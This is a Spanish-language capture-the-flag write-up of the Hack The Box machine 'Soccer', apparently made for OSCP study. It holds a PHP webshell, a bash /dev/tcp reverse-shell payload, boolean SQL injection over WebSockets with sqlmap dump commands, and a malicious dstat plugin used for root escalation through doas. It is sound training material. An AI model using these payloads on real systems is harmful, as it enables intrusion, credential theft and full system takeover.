---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/519
dificultad: Fácil
ip: 10.10.11.194
os: Linux
linked:
  - "[[WebSockets]]"
  - "[[doas]]"
  - "[[dstat]]"
  - "[[nginx]]"
  - "[[Default credentials]]"
  - "[[SQLI HTB Soccer]]"
  - "[[SQLi Boolean-Based]]"
  - "[[SQL Injection (SQLi)]]"
---
# HackTheBox - Soccer

## Reconocimiento

### Ping y Escaneo de Puertos

Verifico la conectividad y el SO de la máquina con `ping`. Un TTL de 63 confirma que es un sistema **Linux**.

```bash
ping -c 1 10.10.11.194
```

> ```
> PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
> 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=61.8 ms
> ```

Escaneo todos los puertos con [[nmap]] para encontrar servicios abiertos.
```bash
nmap -sS --min-rate 5000 -n -Pn -p- --open 10.10.11.194 -oG allPorts
```

> [!note] Puertos Abiertos
> - **22/tcp:** ssh
> - **80/tcp:** http
> - **9091/tcp:** xmltec-xmlmail (probablemente WebSockets)

Lanzo scripts de enumeración de [[nmap]] para obtener más detalles sobre los servicios.
```bash
nmap -sCV -p22,80,9091 10.10.11.194 -oN targeted
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
```

### Enumeración Web (Puerto 80)

El puerto 80 redirige a `soccer.htb`. Añado esta entrada al `/etc/hosts`.
> [!tip] /etc/hosts
> ```
> 10.10.11.194 soccer.htb
> ```

Utilizo [[wfuzz]] para buscar directorios ocultos.
```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://soccer.htb/FUZZ' -t 200
```

> [!SUCCESS] Directorio Encontrado
> Encuentro el directorio `/tiny`, que redirige a un panel de login de **Tiny File Manager**.


---

## Explotación de Vulnerabilidades

### Explotación de Tiny File Manager

Buscando en Google, encuentro las credenciales por defecto para Tiny File Manager.
> [!CAUTION] Credenciales por Defecto
> - **user:** `admin`
> - **password:** `admin@123`

Una vez dentro, veo que puedo subir archivos. Como la web usa PHP, subiré una webshell simple al directorio `/tiny/uploads/`.
> [!note] Webshell PHP
> ```php
> `<?php
>   system($_REQUEST['cmd']);
> ?>`
> ```

Tras subir el archivo como `shell.php`, ejecuto comandos a través de la URL:
`http://soccer.htb/tiny/uploads/shell.php?cmd=whoami`

### Obtener Reverse Shell

Uso la webshell para obtener una reverse shell con [[Netcat]].
```bash
nc -nlvp 443
```

Luego, ejecuto el payload a través de la webshell (URL encodeado):
`http://soccer.htb/tiny/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/TUN_IP/443%200%3E%261%27`

Recibo una shell como `www-data`. Realizamos el tratamiento de la TTY para obtener una shell interactiva.


---

## Escalada de Privilegios (player)

### Reconocimiento como www-data

Inspeccionando la configuración de `nginx` en `/etc/nginx/sites-available/`, encuentro un nuevo subdominio.
```bash
cat /etc/nginx/sites-available/soc-player.htb
```

> [!SUCCESS] Subdominio Descubierto
> - `soc-player.soccer.htb`

Añado el nuevo subdominio a nuestro `/etc/hosts`.

> [!tip] /etc/hosts (Actualizado)
> ```
> 10.10.11.194 soccer.htb soc-player.soccer.htb
> ```

### Explotación de [[WebSockets]] y [[SQL Injection Boolean]]

Al navegar a `http://soc-player.soccer.htb`, encuentro una web similar con un login. Tras crear una cuenta, intercepto el tráfico con Burp Suite y descubro que utiliza [[WebSockets]] en el puerto `9091`.

El campo `id` en la petición WebSocket es vulnerable a [[SQLi Boolean-Based]] basada en booleanos.

> [!CAUTION] Payload de Verificación (SQLi Boolean-Based)
> ```json
> {"id":"1 or substr(database(),1,1)='a'"}
> ```

### a) Dumpeo con desarollo de un script

Desarrollo scripts en Python para automatizar la extracción de datos mediante la inyección SQL. 
[[SQLI HTB Soccer]]

1.  **Obtener nombre de la BBDD:** `soccer_db`
2.  **Obtener tablas:** `accounts`
3.  **Obtener columnas:** `id, email, username, password`
4.  **Dumpear credenciales:**

### b) Dumpeo con sqlmap

Automatizo la explotación con [[sqlmap]], que soporta inyecciones sobre WebSockets.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" \
  --data '{"id": "1"}' \
  --dbms mysql --level 5 --risk 3 --threads 10 --batch --technique B
```

Una vez confirmada la inyección, dumpeo la base de datos `soccer_db`.
```bash
# Listar tablas
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"1"}' -D soccer_db --tables --batch

# Dumpear la tabla 'accounts'
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"1"}' -D soccer_db -T accounts --dump --batch
```

> [!SUCCESS] Credenciales Obtenidas
> - **Usuario:** `player`
> - **Contraseña:** `PlayerOftheMatch2022`

Me conecto por SSH con las credenciales de `player` y obtengo la flag de usuario.

> [!flag] user.txt
> `b4e17edd06d473a7463d00886dafdcc7`


---

## Escalada de Privilegios (root)

### Reconocimiento como player

Busco binarios con permisos SUID.
```bash
find / -perm -4000 2>/dev/null
```

> [!note] Binario SUID Interesante
> `/usr/local/bin/doas`

[[doas]] es una alternativa a `sudo`. Reviso su configuración, que a menudo se encuentra con herramientas como `LinPEAS`.

> [!info] Configuración de doas
> El archivo `/usr/local/etc/doas.conf` revela la siguiente regla:
> `permit nopass player as root cmd /usr/bin/dstat`

El usuario `player` puede ejecutar `/usr/bin/dstat` como `root` sin contraseña.

### Explotación de [[dstat]]

[[dstat]] es una herramienta de monitoreo que permite cargar plugins personalizados desde varias rutas, una de las cuales es `/usr/local/share/dstat/`.

Verifico permisos en ese directorio:
```bash
find / -group player 2>/dev/null -ls | grep -vE "home|proc|run|sys"
```
Tengo permisos de escritura (`rwx`) en `/usr/local/share/dstat`.

La explotación consiste en:
1.  Crear un plugin malicioso para `dstat` en Python.
2.  Guardarlo en `/usr/local/share/dstat/` con el formato `dstat_<nombre_plugin>.py`.
3.  Ejecutar `dstat` con `doas`, invocando el plugin.

Creo el plugin `dstat_pwned.py` que asigna el bit SUID a `/bin/bash`.
```python
# /usr/local/share/dstat/dstat_pwned.py
import os
os.system('chmod u+s /bin/bash')
```

Ejecuto `dstat` con `doas` llamando al plugin:
```bash
doas /usr/bin/dstat --pwned
```

El comando se ejecuta como `root` y modifica los permisos de `bash`. Finalmente, ejecuto `bash` con el parámetro `-p` para obtener una shell de `root` gracias al bit SUID.
```bash
bash -p
whoami
# root
```

Obtengo la flag de root.
> [!flag] root.txt
> `bd1e67df6f523a3f05974c75caf3abb3`

## Bandera(s)

> [!flag] `flag{user}`
> b4e17edd06d473a7463d00886dafdcc7
^bandera-user

> [!flag] `flag{root}`
> bd1e67df6f523a3f05974c75caf3abb3
^bandera-root
